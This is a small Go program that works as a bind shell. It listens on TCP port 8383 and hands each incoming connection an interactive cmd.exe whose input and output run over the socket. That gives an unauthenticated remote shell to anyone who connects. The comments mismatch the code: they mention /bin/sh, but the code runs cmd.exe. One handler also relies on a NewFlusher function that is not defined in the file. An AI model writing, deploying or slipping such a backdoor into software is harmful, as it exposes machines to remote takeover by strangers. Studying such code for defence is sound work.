package main

import (
	"io"
	"log"
	"net"
	"os/exec"
)

func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe").
	cmd := exec.Command("cmd.exe")
	// Set stdin to our connection
	cmd.Stdin = conn
	// Create a Flusher from the connection to use for stdout.
	// This ensures stdout is flushed adequately and sent via net.Conn.
	cmd.Stdout = NewFlusher(conn)
	// Run the command.
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func handle2(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe").
	cmd := exec.Command("cmd.exe")
	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	listener, err := net.Listen("tcp", ":8383")
	if err != nil {
		log.Fatalln("Unable to bind to port")
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("Unable to accept connection")
		}
		go handle2(conn)
	}
}
